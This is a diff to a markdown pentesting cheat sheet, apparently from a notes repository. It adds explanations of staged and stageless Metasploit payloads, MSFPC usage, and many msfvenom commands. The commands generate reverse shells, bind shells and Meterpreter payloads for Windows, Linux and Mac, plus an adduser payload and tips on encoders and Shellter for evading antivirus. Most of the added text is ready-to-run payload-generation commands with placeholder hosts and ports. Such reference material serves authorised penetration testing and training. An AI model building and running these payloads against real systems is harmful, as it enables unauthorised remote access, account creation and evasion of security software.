@@ -297,7 +297,7 @@ When using a meterpreter payload, a handler must be started on the host machine.
 
 The commands to start a metasploit handler are as follows:
 
-```bash
+```
 # msfconsole -q
 
 msf> use exploit multi/handler
@@ -317,19 +317,57 @@ msf> exploit -j -z
 
 ###### MsfVenom
 
-The metasploit framework msfvenom is a powerful standalone payload generator.  
+The metasploit framework msfvenom is a powerful standalone payload generator.
+
+Two kinds of payloads can be generated:
+  - Staged payloads that will require a metasploit handler
+  - Stageless payloads that will not require a metasploit handler (and will
+	  work with netcat for example)
+
 Note that, while offering encoding techniques, the binary payloads generated
 with msfvenom are often detected by AV softwares. To generate stealthier binary
 payloads use Shellter [(Windows / binary) Shellter].
 
+The MSFvenom Payload Creator (MSFPC) bash script can be used to easily generate
+various "basic" Meterpreter payloads via msfvenom:
+
 ```
+<TYPE>:
+   + APK
+   + ASP
+   + ASPX
+   + Bash [.sh]
+   + Java [.jsp]
+   + Linux [.elf]
+   + OSX [.macho]
+   + Perl [.pl]
+   + PHP
+   + Powershell [.ps1]
+   + Python [.py]
+   + Tomcat [.war]
+   + Windows [.exe // .exe // .dll]
+
+./msfpc.sh <TYPE> (<DOMAIN/IP>) (<PORT>) (<CMD/MSF>) (<BIND/REVERSE>) (<STAGED/STAGELESS>) (<TCP/HTTP/HTTPS/FIND_PORT>) (<BATCH/LOOP>) (<VERBOSE>)
+
+msfpc.sh Windows <IP> <PORT> CMD REVERSE STAGELESS TCP
+msfpc.sh Windows <IP> <PORT> MSF REVERSE STAGED TCP
+
+msfpc.sh Linux <IP> <PORT> CMD REVERSE STAGELESS TCP
+msfpc.sh Linux <IP> <PORT> MSF REVERSE STAGED TCP
+```
+
+MsfVenom cheat sheet:
+
+```
+# List platforms: msfvenom --help-platforms
+# Basic platforms: windows & linux
+# Architecture: x86 or x64
 # List payloads: msfvenom --list payloads
 # List formats: msfvenom --help-formats
 # List encoders: msfvenom --list encoders
 # Recommended encoder: -e x86/shikata_ga_nai
 
-msfvenom –p <PAYLOAD> –f <FORMAT> -e <ENCODER> -b <BADCHAR> --smallest LHOST=<LHOST> LPORT=<LPORT> > <FILE>
-
+msfvenom –p <PAYLOAD> [--platform <PLATEFORM>] [-a <ARCHI>] [-e <ENCODER>] [-b <BADCHAR>] [--smallest] LHOST=<LHOST> LPORT=<LPORT> [–f <FORMAT>] > <FILE>
 
 # Windows payloads
 msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > prompt.exe
@@ -338,10 +376,20 @@ msfvenom -p windows/meterpreter/bind_tcp LPORT=<PORT> -f exe > bind.exe
 msfvenom -p windows/adduser USER=<USERNAME> PASS=<PASSWORD> -f exe > adduser.exe
 
 # Linux payloads
+# Bash oneliner
 msfvenom -p cmd/unix/reverse_bash LHOST=<IP> LPORT=<PORT> -f raw > shell.sh
+# Basic and stable
 msfvenom -p generic/shell_bind_tcp LHOST=<IP> LPORT=<PORT> -f elf > term.elf
-msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > reverse.elf
-msfvenom -p linux/x86/meterpreter/bind_tcp LPORT=<PORT> -f elf > bind.elf
+# Stageless - CMD shell
+msfvenom -p linux/x86/shell_bind_tcp --platform linux -a x86 PORT=<PORT> -f elf > bind_stageless.elf
+msfvenom -p linux/x86/shell_reverse_tcp --platform linux -a x86 LHOST=<IP> LPORT=<PORT> -f elf > rev_stageless.elf
+msfvenom -p linux/x64/shell_bind_tcp --platform linux -a x64 PORT=<PORT> -f elf > bind_x64_stageless.elf
+msfvenom -p linux/x64/shell_reverse_tcp --platform linux -a x64 LHOST=<IP> LPORT=<PORT> -f elf > rev_x64_stageless.elf
+# Staged - Meterpreter
+msfvenom -p linux/x86/meterpreter/bind_tcp --platform linux -a x86 PORT=<PORT> -f elf > bind_meterpreter.elf
+msfvenom -p linux/x86/meterpreter/reverse_tcp --platform linux -a x86 LHOST=<IP> LPORT=<PORT> -f elf > reverse_meterpreter.elf
+msfvenom -p linux/x64/meterpreter/bind_tcp --platform linux -a x64 PORT=<PORT> -f elf > bind_meterpreter_x64.elf
+msfvenom -p linux/x64/meterpreter/reverse_tcp --platform linux -a x64 LHOST=<IP> LPORT=<PORT> -f elf > reverse_meterpreter_x64.elf
 
 # Mac payloads
 msfvenom -p osx/x86/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f macho > reverse.macho
